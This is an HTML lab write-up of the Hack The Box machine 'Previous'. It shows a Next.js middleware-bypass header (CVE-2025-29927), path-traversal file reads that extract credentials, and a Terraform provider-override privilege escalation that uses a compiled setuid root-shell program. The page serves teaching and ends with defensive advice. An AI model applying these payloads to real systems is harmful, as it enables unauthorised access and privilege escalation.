<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Previous Writeup | PLSCARRYME - HTB Writeups</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
            line-height: 1.8;
            min-height: 100vh;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid #9fef00;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 0;
        }

        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #9fef00;
            text-decoration: none;
        }

        .back-link {
            color: #9fef00;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            transition: opacity 0.3s ease;
        }

        .back-link:hover {
            opacity: 0.8;
        }

        /* Writeup Header */
        .writeup-header {
            text-align: center;
            padding: 3rem 0;
            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
            margin-bottom: 3rem;
        }

        .writeup-title {
            font-size: 3rem;
            color: #9fef00;
            margin-bottom: 1rem;
            text-shadow: 0 0 20px rgba(159, 239, 0, 0.3);
        }

        .writeup-meta {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
        }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            opacity: 0.8;
        }

        .difficulty {
            padding: 0.5rem 1rem;
            border-radius: 25px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9rem;
        }

        .difficulty.easy { background: #28a745; }
        .difficulty.medium { background: #ffc107; color: #000; }
        .difficulty.hard { background: #dc3545; }

        .writeup-tags {
            display: flex;
            justify-content: center;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .tag {
            background: rgba(159, 239, 0, 0.2);
            color: #9fef00;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.8rem;
        }

        /* Content */
        .writeup-content {
            padding-bottom: 3rem;
        }

        .writeup-content h1,
        .writeup-content h2,
        .writeup-content h3 {
            color: #9fef00;
            margin: 2rem 0 1rem 0;
            border-left: 4px solid #9fef00;
            padding-left: 1rem;
        }

        .writeup-content h1 { font-size: 2rem; }
        .writeup-content h2 { font-size: 1.5rem; }
        .writeup-content h3 { font-size: 1.2rem; }

        .writeup-content p {
            margin-bottom: 1.5rem;
            text-align: justify;
        }

        .writeup-content ul,
        .writeup-content ol {
            margin: 1rem 0 1.5rem 2rem;
        }

        .writeup-content li {
            margin-bottom: 0.5rem;
        }

        /* Code blocks */
        .writeup-content pre {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(159, 239, 0, 0.3);
            border-radius: 8px;
            padding: 1.5rem;
            overflow-x: auto;
            margin: 1.5rem 0;
            position: relative;
        }

        .writeup-content code {
            color: #9fef00;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }

        .writeup-content p code {
            background: rgba(159, 239, 0, 0.2);
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-size: 0.85rem;
        }

        /* Images */
        .writeup-content img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 2rem 0;
            border: 1px solid rgba(159, 239, 0, 0.3);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        /* Blockquotes */
        .writeup-content blockquote {
            border-left: 4px solid #9fef00;
            background: rgba(159, 239, 0, 0.1);
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
            font-style: italic;
        }

        /* Table of Contents */
        .toc {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(159, 239, 0, 0.3);
            border-radius: 8px;
            padding: 2rem;
            margin: 2rem 0;
        }

        .toc h3 {
            color: #9fef00;
            margin-bottom: 1rem;
            border: none;
            padding: 0;
        }

        .toc ul {
            list-style: none;
            margin: 0;
        }

        .toc ul li {
            margin-bottom: 0.5rem;
        }

        .toc a {
            color: #e0e0e0;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .toc a:hover {
            color: #9fef00;
        }

        /* Navigation buttons */
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin: 3rem 0;
            gap: 1rem;
        }

        .nav-button {
            background: linear-gradient(45deg, #9fef00, #7bc800);
            color: #000;
            padding: 1rem 2rem;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            transition: transform 0.2s ease;
            flex: 1;
            text-align: center;
            max-width: 200px;
        }

        .nav-button:hover {
            transform: translateY(-2px);
        }

        .nav-button.disabled {
            background: rgba(255, 255, 255, 0.1);
            color: #666;
            cursor: not-allowed;
        }

        /* Progress bar */
        .reading-progress {
            position: fixed;
            top: 0;
            left: 0;
            width: 0%;
            height: 3px;
            background: linear-gradient(to right, #9fef00, #7bc800);
            z-index: 1000;
            transition: width 0.1s ease;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .writeup-title {
                font-size: 2rem;
            }

            .writeup-meta {
                flex-direction: column;
                gap: 1rem;
            }

            .writeup-content pre {
                padding: 1rem;
                font-size: 0.8rem;
            }

            .nav-buttons {
                flex-direction: column;
            }

            .nav-button {
                max-width: none;
            }
        }

        /* Highlight boxes */
        .info-box {
            background: rgba(0, 123, 255, 0.1);
            border-left: 4px solid #007bff;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
        }

        .warning-box {
            background: rgba(255, 193, 7, 0.1);
            border-left: 4px solid #ffc107;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
        }

        .success-box {
            background: rgba(40, 167, 69, 0.1);
            border-left: 4px solid #28a745;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
        }

        .step-section {
            margin: 3rem 0;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 12px;
            border: 1px solid rgba(159, 239, 0, 0.1);
        }

        /* Toggle sections */
        details {
            margin: 2rem 0;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 12px;
            border: 1px solid rgba(159, 239, 0, 0.1);
        }

        summary {
            font-weight: 600;
            font-size: 1.5em;
            line-height: 1.3;
            margin: 0;
            padding: 1.5rem;
            cursor: pointer;
            color: #9fef00;
            border-radius: 12px;
            transition: background 0.3s ease;
        }

        summary:hover {
            background: rgba(159, 239, 0, 0.05);
        }

        details[open] summary {
            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
            border-radius: 12px 12px 0 0;
        }

        .indented {
            padding: 1.5rem;
        }
    </style>
</head>
<body>
    <div class="reading-progress" id="reading-progress"></div>
    
    <header>
        <nav class="container">
            <a href="../index.html" class="logo"><i class="fas fa-terminal"></i> PLSCARRYME</a>
            <a href="../index.html" class="back-link">
                <i class="fas fa-arrow-left"></i>
                Back to Home
            </a>
        </nav>
    </header>

    <main class="container">
        <section class="writeup-header">
            <h1 class="writeup-title">‚èÆÔ∏è Previous</h1>
            
            <div class="writeup-meta">
                <div class="meta-item">
                    <i class="fas fa-calendar"></i>
                    <span>September 6, 2025</span>
                </div>
                <div class="meta-item">
                    <i class="fas fa-desktop"></i>
                    <span>Linux</span>
                </div>
                <div class="meta-item">
                    <i class="fas fa-clock"></i>
                    <span>8 hours</span>
                </div>
                <div class="meta-item">
                    <span class="difficulty medium">Medium</span>
                </div>
            </div>

            <div class="writeup-tags">
                <span class="tag">Next.js</span>
                <span class="tag">CVE-2025-29927</span>
                <span class="tag">Middleware Bypass</span>
                <span class="tag">LFI</span>
                <span class="tag">Terraform</span>
                <span class="tag">sudo</span>
                <span class="tag">Provider Override</span>
            </div>
        </section>

        <section class="writeup-content">
            <details open>
                <summary>User</summary>
                <div class="indented">
                    <h3>üîß Initial Setup</h3>
                    <p>First, I added the target to my hosts file for proper DNS resolution:</p>
                    
                    <pre><code class="language-bash">echo "10.10.11.83 previous.htb" | sudo tee -a /etc/hosts</code></pre>

                    <hr>

                    <h3>üîç Nmap Enumeration</h3>
                    <p>Starting with a comprehensive port scan to identify running services:</p>
                    
                    <pre><code class="language-bash">nmap -Pn -A 10.10.11.83</code></pre>

                    <p>Key findings from the scan:</p>
                    <ul>
                        <li><strong>Port 22 (SSH)</strong> ‚Äì OpenSSH 8.9p1 on Ubuntu, potential entry point for later access</li>
                        <li><strong>Port 80 (HTTP)</strong> ‚Äì nginx 1.18.0, redirects to <code>previous.htb</code></li>
                    </ul>

                    <p>The target appears to be running Ubuntu Linux with a standard web server configuration.</p>

                    <hr>

                    <h3>üåê Web Application Analysis</h3>
                    <p>Accessing <code>http://10.10.11.83</code> automatically redirects to <code>previous.htb</code>, revealing a modern web application.</p>

                    <img src="image.png" alt="Previous.htb homepage showing a modern web interface">

                    <p>Examining the source code revealed an interesting credential in the HTML comments:</p>
                    
                    <img src="image 1.png" alt="HTML source code revealing jeremy@previous.htb email address">

                    <div class="info-box">
                        <strong>Discovery:</strong> Found potential username <code>jeremy@previous.htb</code> in the application source
                    </div>

                    <p>When clicking "Get Started" or "Docs", the application redirects to a login page, indicating authentication is required for accessing protected content.</p>

                    <img src="image 2.png" alt="Login page showing authentication requirement">

                    <hr>

                    <h3>üîß Technology Stack Identification</h3>
                    <p>Using browser developer tools and Wappalyzer, I identified the technology stack:</p>

                    <img src="image 3.png" alt="Wappalyzer results showing Next.js 15.2.2 and nginx versions">

                    <div class="warning-box">
                        <strong>Critical Finding:</strong> The application runs <strong>Next.js 15.2.2</strong>, which is vulnerable to CVE-2025-29927 - an authentication bypass via middleware manipulation
                    </div>

                    <p>This vulnerability allows bypassing authentication middleware by sending a crafted <code>x-middleware-subrequest</code> header, making it a prime attack vector.</p>

                    <hr>

                    <h3>‚ö° CVE-2025-29927 - Next.js Middleware Bypass</h3>
                    <p>With Next.js 15.2.2 confirmed, I tested the authentication bypass vulnerability manually using Burp Suite.</p>

                    <p>The attack process:</p>
                    <ol>
                        <li>Intercept a request to a protected route like <code>/docs</code> or <code>/get-started</code></li>
                        <li>Observe the baseline response: <strong>307 redirect to /login</strong></li>
                        <li>Add the crafted header to bypass middleware authentication</li>
                    </ol>

                    <p>Without the bypass header, requests return a 307 redirect:</p>
                    <img src="image 4.png" alt="Burp Suite showing 307 redirect to login page">

                    <p>Adding the exploit header successfully bypasses authentication:</p>
                    <pre><code class="language-http">X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware</code></pre>

                    <img src="image 5.png" alt="Successful bypass showing 200 OK response with content">

                    <div class="success-box">
                        <strong>Exploitation Success:</strong> The middleware bypass works! Status changed from 307 to 200 OK, and we can access protected content.
                    </div>

                    <hr>

                    <h3>üìÇ Route Discovery via Build Manifest</h3>
                    <p>Analyzing the bypassed response revealed references to JavaScript files, including <code>_buildManifest.js</code> which contains route mappings.</p>

                    <p>Key routes discovered from the build manifest:</p>
                    <ul>
                        <li><code>/docs</code></li>
                        <li><code>/docs/components/layout</code></li>
                        <li><code>/docs/components/sidebar</code></li>
                        <li><code>/docs/content/examples</code></li>
                        <li><code>/docs/content/getting-started</code></li>
                    </ul>

                    <p>The <code>/docs/content/examples</code> route appeared particularly interesting for further exploration.</p>

                    <img src="image 6.png" alt="Examples page showing downloadable content with file parameter">

                    <hr>

                    <h3>üîì Local File Inclusion (LFI) Discovery</h3>
                    <p>While exploring <code>/docs/content/examples</code>, I discovered a download feature that accepts file parameters:</p>

                    <pre><code class="language-http">GET /api/download?example=hello-world.ts HTTP/1.1</code></pre>

                    <p>The <code>example</code> parameter directly fetches files from the server, making it a potential Local File Inclusion (LFI) target.</p>

                    <h3>üéØ LFI Exploitation with ffuf</h3>
                    <p>I used ffuf to automate LFI testing with common Linux file paths:</p>

                    <pre><code class="language-bash">ffuf -u "http://previous.htb/api/download?example=../../../../../../FUZZ" \
  -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -mr "root:x"</code></pre>

                    <img src="image 7.png" alt="ffuf results showing successful LFI discovery">

                    <div class="success-box">
                        <strong>LFI Confirmed:</strong> Successfully retrieved <code>/etc/passwd</code> content, confirming the vulnerability
                    </div>

                    <img src="image 8.png" alt="Contents of /etc/passwd showing user jeremy">

                    <p>The passwd file revealed the <code>jeremy</code> user we discovered earlier, confirming our enumeration was accurate.</p>

                    <hr>

                    <h3>üîç Next.js Configuration Extraction</h3>
                    <p>Understanding Next.js application structure, I targeted configuration files that might contain sensitive information.</p>

                    <p>Key file retrieved: <code>.env.local</code> containing environment variables:</p>
                    <img src="image 9.png" alt="Environment file showing NEXTAUTH_SECRET">

                    <p>While I discovered the <code>NEXTAUTH_SECRET</code>, attempts to forge valid JWT tokens were unsuccessful as the server returned empty responses.</p>

                    <hr>

                    <h3>üìÅ Build Manifest Analysis</h3>
                    <p>I accessed the build manifest to understand the application's route structure:</p>
                    <pre><code class="language-http">GET /api/download?example=../../_next/static/{buildId}/_buildManifest.js</code></pre>

                    <img src="image 10.png" alt="Build manifest showing dynamic routes including NextAuth">

                    <p>The manifest revealed a critical dynamic route:</p>
                    <pre><code class="language-json">"dynamicRoutes": [
  {
    "page": "/api/auth/[...nextauth]",
    "regex": "^/api/auth/(.+?)(?:/)?$"
  }
]</code></pre>

                    <hr>

                    <h3>üîë Credential Discovery in NextAuth Module</h3>
                    <p>Targeting the NextAuth configuration file for credential extraction:</p>
                    <pre><code class="language-http">GET /api/download?example=../../.next/server/pages/api/auth/[...nextauth].js</code></pre>

                    <img src="image 11.png" alt="NextAuth configuration file revealing jeremy's credentials">

                    <div class="success-box">
                        <strong>Credentials Found:</strong> jeremy@previous.htb:MyNameIsJeremyAndILovePancakes
                    </div>

                    <p>The NextAuth configuration contained hardcoded credentials for the jeremy user, providing our path to system access.</p>

                    <hr>

                    <h3>üîê SSH Access as Jeremy</h3>
                    <p>Using the extracted credentials to establish SSH access:</p>

                    <pre><code class="language-bash">ssh jeremy@previous.htb</code></pre>

                    <p>Authentication successful! I now have shell access as the jeremy user.</p>

                    <img src="image 12.png" alt="Successful SSH login and user flag capture">

                    <div class="success-box">
                        <strong>User Flag:</strong> Successfully captured user.txt from jeremy's home directory
                    </div>
                </div>
            </details>

            <details open>
                <summary>Root</summary>
                <div class="indented">
                    <h3>üîç Privilege Escalation Enumeration</h3>
                    <p>Checking sudo privileges for potential escalation paths:</p>

                    <pre><code class="language-bash">sudo -l</code></pre>

                    <p>Output revealed an interesting sudo permission:</p>
                    <pre><code class="language-text">User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir=/opt/examples apply</code></pre>

                    <div class="info-box">
                        <strong>Privilege Escalation Vector:</strong> Jeremy can run Terraform as root, but only with the specific <code>-chdir=/opt/examples</code> parameter
                    </div>

                    <hr>

                    <h3>üèóÔ∏è Understanding Terraform Configuration</h3>
                    <p>Terraform is an Infrastructure as Code tool that uses providers and modules to manage resources. The key insight is that Terraform can load and execute custom provider plugins.</p>

                    <img src="image 13.png" alt="Terraform logo and explanation">

                    <p>Examining the Terraform configuration in jeremy's home directory:</p>
                    
                    <img src="image 14.png" alt="Contents of .terraformrc file showing provider overrides">

                    <p>The <code>.terraformrc</code> file contains a critical misconfiguration:</p>
                    <pre><code class="language-hcl">provider_installation {
    dev_overrides {
        "previous.htb/terraform/examples" = "/usr/local/go/bin"
    }
    direct {}
}</code></pre>

                    <p>This configuration uses <code>dev_overrides</code> to redirect the provider <code>previous.htb/terraform/examples</code> to load from a local path instead of downloading from a registry.</p>

                    <hr>

                    <h3>‚ö° Terraform Provider Override Exploitation</h3>
                    <p>The exploitation strategy involves:</p>
                    <ol>
                        <li>Creating a malicious binary to replace the Terraform provider</li>
                        <li>Modifying the <code>.terraformrc</code> to point to a writable directory</li>
                        <li>Triggering Terraform apply with sudo to execute our payload as root</li>
                    </ol>

                    <p>First, I modified the <code>.terraformrc</code> file to point to <code>/tmp</code> (a writable directory):</p>
                    
                    <img src="image 15.png" alt="Modified .terraformrc pointing to /tmp directory">

                    <hr>

                    <h3>üî® Creating the Privilege Escalation Payload</h3>
                    <p>I created a simple C program to spawn a root shell:</p>

                    <pre><code class="language-c">// exploit.c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash","bash","-p",NULL);
}</code></pre>

                    <p>Compiled the exploit directly to the expected provider path:</p>
                    <pre><code class="language-bash">gcc /home/jeremy/exploit.c -o /tmp/terraform-provider-examples
chmod +x /tmp/terraform-provider-examples</code></pre>

                    <hr>

                    <h3>üöÄ Triggering the Exploitation</h3>
                    <p>With the malicious provider in place, I executed the sudo command:</p>

                    <pre><code class="language-bash">sudo /usr/bin/terraform -chdir=/opt/examples apply</code></pre>

                    <p>When Terraform runs, it attempts to load the <code>examples</code> provider from our overridden path. Since we control that path, our malicious binary executes with root privileges.</p>

                    <img src="image 16.png" alt="Successful root shell acquisition showing id command output">

                    <p>Running our elevated bash shell:</p>
                    <pre><code class="language-bash">./bash -p</code></pre>

                    <div class="success-box">
                        <strong>Root Access Achieved:</strong>
                        <br>uid=1000(jeremy) gid=1000(jeremy) euid=0(root) egid=0(root)
                        <br><strong>Root Flag:</strong> 97a6e03d8af5dda6ffe6d8079bb199a2
                    </div>
                </div>
            </details>

            <!-- Summary Section -->
            <div class="step-section">
                <h2>üéØ Attack Chain Summary</h2>
                <p>This machine demonstrated a complete web application to root compromise through modern framework vulnerabilities and infrastructure misconfigurations:</p>

                <pre><code class="language-text">Web Reconnaissance 
    ‚Üí Next.js Version Identification (15.2.2)
    ‚Üí CVE-2025-29927 Middleware Bypass
    ‚Üí Protected Route Access
    ‚Üí Local File Inclusion Discovery
    ‚Üí NextAuth Configuration Extraction
    ‚Üí SSH Credentials (jeremy)
    ‚Üí Terraform sudo Privileges
    ‚Üí Provider Override Misconfiguration
    ‚Üí Root Shell Execution</code></pre>

                <h3>Key Techniques Demonstrated</h3>
                <ul>
                    <li><strong>Framework Vulnerability Exploitation:</strong> CVE-2025-29927 Next.js middleware bypass</li>
                    <li><strong>Local File Inclusion:</strong> Extracting sensitive configuration files through path traversal</li>
                    <li><strong>Configuration File Analysis:</strong> Understanding Next.js application structure for targeted file extraction</li>
                    <li><strong>Credential Discovery:</strong> Finding hardcoded credentials in application configuration</li>
                    <li><strong>Infrastructure as Code Exploitation:</strong> Terraform provider override abuse for privilege escalation</li>
                    <li><strong>sudo Misconfiguration:</strong> Leveraging specific command permissions for root access</li>
                </ul>

                <h3>Tools and Technologies Used</h3>
                <ul>
                    <li><strong>Nmap:</strong> Network reconnaissance and service enumeration</li>
                    <li><strong>Burp Suite:</strong> Web application testing and request manipulation</li>
                    <li><strong>ffuf:</strong> Directory and file fuzzing for LFI discovery</li>
                    <li><strong>Next.js:</strong> Understanding framework structure and vulnerabilities</li>
                    <li><strong>Terraform:</strong> Infrastructure as Code exploitation and provider manipulation</li>
                    <li><strong>GCC:</strong> Compiling custom privilege escalation payloads</li>
                </ul>

                <div class="warning-box">
                    <strong>Defensive Recommendations:</strong> Regular framework updates, secure configuration management, proper input validation, and restricted sudo permissions can prevent these attack vectors. Additionally, using signed providers and avoiding dev_overrides in production environments is critical for Terraform security.
                </div>
            </div>
        </section>

        <div class="nav-buttons">
            <a href="../index.html" class="nav-button">
                <i class="fas fa-home"></i> Back to Home
            </a>
            <a href="#" class="nav-button disabled">
                Next Writeup <i class="fas fa-arrow-right"></i>
            </a>
        </div>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    
    <script>
        // Reading progress bar
        function updateReadingProgress() {
            const article = document.querySelector('.writeup-content');
            const progressBar = document.getElementById('reading-progress');
            
            const articleTop = article.offsetTop;
            const articleHeight = article.offsetHeight;
            const windowHeight = window.innerHeight;
            const scrollTop = window.pageYOffset;
            
            const progress = (scrollTop - articleTop + windowHeight/2) / articleHeight;
            const progressPercentage = Math.max(0, Math.min(100, progress * 100));
            
            progressBar.style.width = progressPercentage + '%';
        }

        // Smooth scrolling for TOC links
        document.querySelectorAll('.toc a').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Initialize
        window.addEventListener('scroll', updateReadingProgress);
        window.addEventListener('load', updateReadingProgress);
    </script>
</body>
</html>